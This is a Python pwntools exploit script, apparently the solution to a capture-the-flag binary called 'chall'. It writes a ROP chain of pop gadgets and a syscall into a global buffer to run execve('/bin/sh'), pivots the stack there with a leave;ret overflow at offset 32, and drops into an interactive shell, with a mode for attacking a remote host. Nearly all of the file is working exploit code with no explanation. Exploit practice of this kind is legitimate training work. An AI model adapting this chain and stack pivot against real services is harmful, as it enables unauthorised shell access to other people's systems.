#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *horcrux+104
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    buffer = 0x4040a0
    pop_rax = 0x401231 # pop rax; ret; 
    pop_rdi = 0x401233 # pop rdi; ret;
    pop_rsi = 0x401235 # pop rsi; ret;
    pop_rdx = 0x401237 # pop rdx; ret;
    syscall = 0x401239 # syscall; ret;

    chain = flat([
        pop_rdi,
        buffer+0x50,
        pop_rsi,
        0x0,
        pop_rdx,
        0x0,
        pop_rax,
        0x3b,
        syscall
    ])

    io.recvuntil(b">")
    rop_chain = b"a"*8 + chain +b"/bin/sh\x00"
    io.sendline(rop_chain)

    offset = 32

    leave = 0x4012a8 # leave; ret;

    """
    mov rsp, rbp
    pop rbp
    pop rip
    """

    pivot = flat({
        offset: [
            buffer,
            leave
        ]
    })

    io.recvuntil(b">")
    io.sendline(pivot)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

